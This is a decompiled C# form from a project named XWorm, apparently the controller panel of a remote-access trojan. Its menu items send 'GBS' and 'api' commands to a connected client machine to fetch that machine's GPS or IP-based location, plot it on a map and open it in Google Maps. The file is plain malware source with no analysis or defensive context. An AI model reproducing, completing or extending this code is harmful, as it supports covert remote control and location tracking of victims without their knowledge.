using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using GMap.NET.WindowsForms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200001E RID: 30
	[DesignerGenerated]
	public partial class Maps : Form
	{
		// Token: 0x06000628 RID: 1576 RVA: 0x00037850 File Offset: 0x00035A50
		public Maps()
		{
			base.FormClosing += this.Maps_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x17000248 RID: 584
		// (get) Token: 0x0600062B RID: 1579 RVA: 0x00037F05 File Offset: 0x00036105
		// (set) Token: 0x0600062C RID: 1580 RVA: 0x00037F0F File Offset: 0x0003610F
		internal virtual GMapControl GMapControl1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000249 RID: 585
		// (get) Token: 0x0600062D RID: 1581 RVA: 0x00037F18 File Offset: 0x00036118
		// (set) Token: 0x0600062E RID: 1582 RVA: 0x00037F24 File Offset: 0x00036124
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x1700024A RID: 586
		// (get) Token: 0x0600062F RID: 1583 RVA: 0x00037F67 File Offset: 0x00036167
		// (set) Token: 0x06000630 RID: 1584 RVA: 0x00037F71 File Offset: 0x00036171
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024B RID: 587
		// (get) Token: 0x06000631 RID: 1585 RVA: 0x00037F7A File Offset: 0x0003617A
		// (set) Token: 0x06000632 RID: 1586 RVA: 0x00037F84 File Offset: 0x00036184
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024C RID: 588
		// (get) Token: 0x06000633 RID: 1587 RVA: 0x00037F8D File Offset: 0x0003618D
		// (set) Token: 0x06000634 RID: 1588 RVA: 0x00037F97 File Offset: 0x00036197
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700024D RID: 589
		// (get) Token: 0x06000635 RID: 1589 RVA: 0x00037FA0 File Offset: 0x000361A0
		// (set) Token: 0x06000636 RID: 1590 RVA: 0x00037FAC File Offset: 0x000361AC
		internal virtual ToolStripMenuItem GPSToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._GPSToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GPSToolStripMenuItem1_Click);
				ToolStripMenuItem gpstoolStripMenuItem = this._GPSToolStripMenuItem1;
				if (gpstoolStripMenuItem != null)
				{
					gpstoolStripMenuItem.Click -= value2;
				}
				this._GPSToolStripMenuItem1 = value;
				gpstoolStripMenuItem = this._GPSToolStripMenuItem1;
				if (gpstoolStripMenuItem != null)
				{
					gpstoolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700024E RID: 590
		// (get) Token: 0x06000637 RID: 1591 RVA: 0x00037FEF File Offset: 0x000361EF
		// (set) Token: 0x06000638 RID: 1592 RVA: 0x00037FFC File Offset: 0x000361FC
		internal virtual ToolStripMenuItem IPAPIToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._IPAPIToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.IPAPIToolStripMenuItem_Click);
				ToolStripMenuItem ipapitoolStripMenuItem = this._IPAPIToolStripMenuItem;
				if (ipapitoolStripMenuItem != null)
				{
					ipapitoolStripMenuItem.Click -= value2;
				}
				this._IPAPIToolStripMenuItem = value;
				ipapitoolStripMenuItem = this._IPAPIToolStripMenuItem;
				if (ipapitoolStripMenuItem != null)
				{
					ipapitoolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700024F RID: 591
		// (get) Token: 0x06000639 RID: 1593 RVA: 0x0003803F File Offset: 0x0003623F
		// (set) Token: 0x0600063A RID: 1594 RVA: 0x0003804C File Offset: 0x0003624C
		internal virtual ToolStripMenuItem BrowserToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._BrowserToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BrowserToolStripMenuItem_Click);
				ToolStripMenuItem browserToolStripMenuItem = this._BrowserToolStripMenuItem;
				if (browserToolStripMenuItem != null)
				{
					browserToolStripMenuItem.Click -= value2;
				}
				this._BrowserToolStripMenuItem = value;
				browserToolStripMenuItem = this._BrowserToolStripMenuItem;
				if (browserToolStripMenuItem != null)
				{
					browserToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x0600063B RID: 1595 RVA: 0x00038090 File Offset: 0x00036290
		private void Maps_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("Clmaps");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600063C RID: 1596 RVA: 0x000380D0 File Offset: 0x000362D0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600063D RID: 1597 RVA: 0x00038128 File Offset: 0x00036328
		private void GPSToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.GMapControl1.Overlays.Clear();
			byte[] state = Helper.SB("GBS");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600063E RID: 1598 RVA: 0x00038178 File Offset: 0x00036378
		private void IPAPIToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.GMapControl1.Overlays.Clear();
			byte[] state = Helper.SB("api");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x0600063F RID: 1599 RVA: 0x000381C8 File Offset: 0x000363C8
		private void BrowserToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.ToolStripStatusLabel1.Text, "Error!", false) == 0 | Operators.CompareString(this.ToolStripStatusLabel1.Text, "..", false) == 0 | Operators.CompareString(this.ToolStripStatusLabel1.Text, null, false) == 0;
				if (!flag)
				{
					Process.Start("https://www.google.com/maps/place/" + this.ToolStripStatusLabel1.Text);
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x04000286 RID: 646
		public Client C;
	}
}
